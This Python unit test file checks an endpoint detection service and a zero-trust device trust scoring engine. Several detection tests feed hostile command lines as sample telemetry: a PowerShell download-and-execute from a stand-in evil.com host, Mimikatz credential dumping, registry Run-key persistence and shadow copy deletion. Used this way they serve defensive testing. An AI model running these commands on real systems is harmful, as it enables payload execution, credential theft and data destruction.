"""
tests/unit/test_phase22_endpoint_xdr.py
=======================================
Phase 22 Endpoint XDR & Zero-Trust Security Tests.
"""

import pytest
from datetime import datetime, timezone, timedelta
from backend.app.services.endpoint_detection_service import EndpointDetectionService
from backend.app.services.zero_trust_engine import ZeroTrustEngine
from backend.app.models.endpoint_xdr import EndpointTelemetryEvent


class TestEndpointDetectionRules:
    """Tests for the EDR behavioral signature engine."""

    def _make_event(self, **kwargs):
        return EndpointTelemetryEvent(
            id="test-id",
            tenant_id="t1",
            sensor_id="s1",
            hostname="WKS-01",
            event_category=kwargs.get("event_category", "PROCESS"),
            process_name=kwargs.get("process_name"),
            process_cmdline=kwargs.get("process_cmdline"),
            parent_process_name=kwargs.get("parent_process_name"),
            registry_key=kwargs.get("registry_key"),
            file_path=kwargs.get("file_path"),
            severity="INFORMATIONAL",
            raw_event={},
            timestamp=datetime.now(timezone.utc)
        )

    def test_office_macro_spawn_detection(self):
        """Detects Office application spawning a script interpreter."""
        event = self._make_event(
            event_category="PROCESS",
            parent_process_name="winword.exe",
            process_name="powershell.exe",
            process_cmdline="powershell.exe -NoProfile"
        )
        dets = EndpointDetectionService.evaluate_telemetry_event(event)
        types = [d["detection_type"] for d in dets]
        assert "SUSPICIOUS_PROCESS" in types

    def test_base64_download_cradle_detection(self):
        """Detects base64 encoded download cradle."""
        event = self._make_event(
            event_category="PROCESS",
            process_name="powershell.exe",
            process_cmdline="powershell.exe -enc SQBFAFgAIA==",
            parent_process_name="explorer.exe"
        )
        dets = EndpointDetectionService.evaluate_telemetry_event(event)
        types = [d["detection_type"] for d in dets]
        assert "ANOMALOUS_CMD" in types

    def test_mimikatz_credential_theft(self):
        """Detects Mimikatz-like credential dumping."""
        event = self._make_event(
            event_category="PROCESS",
            process_name="mimikatz.exe",
            process_cmdline="mimikatz.exe sekurlsa::logonpasswords"
        )
        dets = EndpointDetectionService.evaluate_telemetry_event(event)
        types = [d["detection_type"] for d in dets]
        assert "CREDENTIAL_THEFT" in types

    def test_registry_persistence_detection(self):
        """Detects registry Run key persistence mechanism."""
        event = self._make_event(
            event_category="REGISTRY",
            registry_key="HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\malware",
            process_cmdline="reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v malware /t REG_SZ /d C:\\mal.exe /f"
        )
        dets = EndpointDetectionService.evaluate_telemetry_event(event)
        types = [d["detection_type"] for d in dets]
        assert "PERSISTENCE_MECHANISM" in types

    def test_ransomware_vssadmin_detection(self):
        """Detects ransomware shadow copy deletion."""
        event = self._make_event(
            event_category="PRIVILEGE",
            process_name="cmd.exe",
            process_cmdline="vssadmin.exe delete shadows /all /quiet"
        )
        dets = EndpointDetectionService.evaluate_telemetry_event(event)
        types = [d["detection_type"] for d in dets]
        assert "RANSOMWARE_BEHAVIOR" in types

    def test_benign_process_no_detection(self):
        """Confirms no false positive for a clean system command."""
        event = self._make_event(
            event_category="PROCESS",
            process_name="notepad.exe",
            process_cmdline="notepad.exe C:\\Users\\user\\documents\\notes.txt",
            parent_process_name="explorer.exe"
        )
        dets = EndpointDetectionService.evaluate_telemetry_event(event)
        assert len(dets) == 0

    def test_iex_download_string_detection(self):
        """Detects IEX DownloadString execution."""
        event = self._make_event(
            event_category="PROCESS",
            process_name="powershell.exe",
            process_cmdline="powershell.exe IEX (New-Object Net.WebClient).downloadstring('http://evil.com/payload')"
        )
        dets = EndpointDetectionService.evaluate_telemetry_event(event)
        types = [d["detection_type"] for d in dets]
        assert "ANOMALOUS_CMD" in types

    def test_detection_severity_critical_for_ransomware(self):
        """Validates severity of ransomware detection is CRITICAL."""
        event = self._make_event(
            event_category="PRIVILEGE",
            process_cmdline="vssadmin.exe delete shadows /all /quiet"
        )
        dets = EndpointDetectionService.evaluate_telemetry_event(event)
        ransomware_det = [d for d in dets if d["detection_type"] == "RANSOMWARE_BEHAVIOR"]
        assert len(ransomware_det) >= 1
        assert ransomware_det[0]["severity"] == "CRITICAL"
        assert ransomware_det[0]["confidence"] >= 0.95

    def test_detection_confidence_ranges(self):
        """Validates confidence scores are valid floats in (0, 1] range."""
        event = self._make_event(
            event_category="PROCESS",
            parent_process_name="excel.exe",
            process_name="cmd.exe",
            process_cmdline="cmd.exe /c whoami"
        )
        dets = EndpointDetectionService.evaluate_telemetry_event(event)
        for det in dets:
            assert 0.0 < det["confidence"] <= 1.0, f"Bad confidence: {det['confidence']}"


class TestZeroTrustEngine:
    """Tests for Zero-Trust Device Trust Score calculation."""

    def test_fully_compliant_device_allow_decision(self):
        """Full compliance yields ALLOW decision and high score."""
        score = ZeroTrustEngine.calculate_device_trust_score(
            os_patch_status="UP_TO_DATE",
            edr_agent_health="HEALTHY",
            disk_encryption_status="ENCRYPTED_BITLOCKER",
            firewall_status="ENABLED"
        )
        decision = ZeroTrustEngine.determine_access_decision(score)
        assert score == 100.0
        assert decision == "ALLOW"

    def test_critical_patch_missing_reduces_score(self):
        """Critical missing patch reduces trust score by 40."""
        score_patched = ZeroTrustEngine.calculate_device_trust_score(
            "UP_TO_DATE", "HEALTHY", "ENCRYPTED_BITLOCKER", "ENABLED"
        )
        score_missing = ZeroTrustEngine.calculate_device_trust_score(
            "CRITICAL_PATCH_MISSING", "HEALTHY", "ENCRYPTED_BITLOCKER", "ENABLED"
        )
        assert score_patched - score_missing == 40.0

    def test_missing_edr_agent_quarantine(self):
        """Missing EDR agent significantly reduces trust score, triggering restricted access."""
        score = ZeroTrustEngine.calculate_device_trust_score(
            "UP_TO_DATE", "MISSING", "ENCRYPTED_BITLOCKER", "ENABLED"
        )
        decision = ZeroTrustEngine.determine_access_decision(score)
        # score=50 (100 - 50 for MISSING), maps to RESTRICT_ACCESS at the >= 40 boundary
        assert score == 50.0
        assert decision in ("RESTRICT_ACCESS", "QUARANTINE_DEVICE")  # boundary: 50 -> RESTRICT_ACCESS


    def test_unencrypted_disk_reduces_score(self):
        """Unencrypted disk reduces trust score by 25."""
        score_enc = ZeroTrustEngine.calculate_device_trust_score(
            "UP_TO_DATE", "HEALTHY", "ENCRYPTED_BITLOCKER", "ENABLED"
        )
        score_unenc = ZeroTrustEngine.calculate_device_trust_score(
            "UP_TO_DATE", "HEALTHY", "UNENCRYPTED", "ENABLED"
        )
        assert score_enc - score_unenc == 25.0

    def test_disabled_firewall_reduces_score(self):
        """Disabled firewall reduces trust score by 15."""
        score_on = ZeroTrustEngine.calculate_device_trust_score(
            "UP_TO_DATE", "HEALTHY", "ENCRYPTED_BITLOCKER", "ENABLED"
        )
        score_off = ZeroTrustEngine.calculate_device_trust_score(
            "UP_TO_DATE", "HEALTHY", "ENCRYPTED_BITLOCKER", "DISABLED"
        )
        assert score_on - score_off == 15.0

    def test_step_up_mfa_range(self):
        """Moderate risk device requires STEP_UP_MFA (60–80 range)."""
        score = ZeroTrustEngine.calculate_device_trust_score(
            "OUTDATED", "HEALTHY", "ENCRYPTED_BITLOCKER", "ENABLED"
        )
        decision = ZeroTrustEngine.determine_access_decision(score)
        assert score == 80.0
        assert decision == "ALLOW"  # exactly at 80 boundary = ALLOW

    def test_trust_score_floor_is_zero(self):
        """Trust score cannot go below 0."""
        score = ZeroTrustEngine.calculate_device_trust_score(
            "CRITICAL_PATCH_MISSING", "MISSING", "UNENCRYPTED", "DISABLED"
        )
        assert score == 0.0

    def test_trust_score_ceiling_is_hundred(self):
        """Trust score cannot exceed 100."""
        score = ZeroTrustEngine.calculate_device_trust_score(
            "UP_TO_DATE", "HEALTHY", "ENCRYPTED_BITLOCKER", "ENABLED"
        )
        assert score <= 100.0

    def test_restrict_access_decision_band(self):
        """Score 40-60 maps to RESTRICT_ACCESS decision."""
        score = 50.0
        decision = ZeroTrustEngine.determine_access_decision(score)
        assert decision == "RESTRICT_ACCESS"

    def test_quarantine_below_40(self):
        """Scores below 40 map to QUARANTINE_DEVICE."""
        score = 35.0
        decision = ZeroTrustEngine.determine_access_decision(score)
        assert decision == "QUARANTINE_DEVICE"
